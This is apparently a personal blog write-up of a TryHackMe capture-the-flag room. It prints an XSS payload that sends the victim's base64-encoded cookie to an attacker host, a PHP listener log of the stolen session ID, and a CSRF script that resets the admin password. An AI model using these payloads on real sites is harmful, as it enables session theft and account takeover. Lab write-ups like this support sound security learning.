---
created: 2026-11-17
tags:
  - note
  - journal
  - cyberStuff
  - thm
title: what your  name - THM
date: 2026-11-17T08:21:05.598Z
lastmod: 2026-11-17T09:31:10.455Z
---
link:https://tryhackme.com/room/whatsyourname\
i will skip recon this time because the scope of room is implicit csrf and xss\
add the site to /etc/hosts\
go to the web server, register

![](/images/blog-ul-meu/static/Pasted%20image%2020261117102926.png)\
after registration we are prompted that we need to wait for a moderator confirmation

![](/images/blog-ul-meu/static/Pasted%20image%2020261117103548.png)\
i thought that i can modify a certain field using this syntax but it was not the case, ignore this.\
we need to xss , create another account with this playload as the email value:

```javascript
<script>fetch("http://YOUT_IP:81?cookie="+ btoa(document.cookie),{method: "GET"});</script>
```

and before press register start a php server to have a POST request to your machine:

```bash
php -S 0.0.0.0:81
```

after waiting a few seconds we get a cookie value

```bash
[Tue Nov 17 10:41:23 2026] PHP 8.4.24 Development Server (http://0.0.0.0:81) started
[Tue Nov 17 10:44:03 2026] 10.114.178.183:42640 Accepted
[Tue Nov 17 10:44:03 2026] 10.114.178.183:42640 [200]: GET /?cookie=UEhQU0VTU0lEPTlhN2xuYzI1ZTJidDNpYTZlZmtmZWs4MjJv
[Tue Nov 17 10:44:03 2026] 10.114.178.183:42640 Closing
```

dont forget that we have to decode it using base64\
use:

```bash
echo "yourCOOCKIE" | base64 -d 
```

after that go to the website and change the PHPSESSID value to the new found one

![](/images/blog-ul-meu/static/Pasted%20image%2020261117104733.png)\
and we are moderator now cool\
on the moderator page we found details about a login.worldwap.thm\
add this new page also to /etc/hosts, then access it in your browser\
and we got the first flag:\
![](/images/blog-ul-meu/static/Pasted%20image%2020261117105336.png)\
inside this new page we found a Admin bot , being the online accessible chat it must be out attack vector.\
![](/images/blog-ul-meu/static/Pasted%20image%2020261117105439.png)\
i tried the same payload as before and it returned it doesn't load anything, perhaps some kind of railguard.\
![](/images/blog-ul-meu/static/Pasted%20image%2020261117105601.png)\
we have to access the `reset password` functionality as admin somehow\
we can use this script from [0xb0b](https://0xb0b.gitbook.io/writeups/tryhackme/2024/whats-your-name) write up

```javascript
<script>
    window.onload = function() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = "ht"+"Tp://"+"login.worldwap.thm/change_password.php";
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'new_password';
        input.value = 'hello';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
    };
</script>
```

this will prompt us with a reset password page , after setting another admin password we can log in and get the flag\
![](/images/blog-ul-meu/static/Pasted%20image%2020261117113108.png)
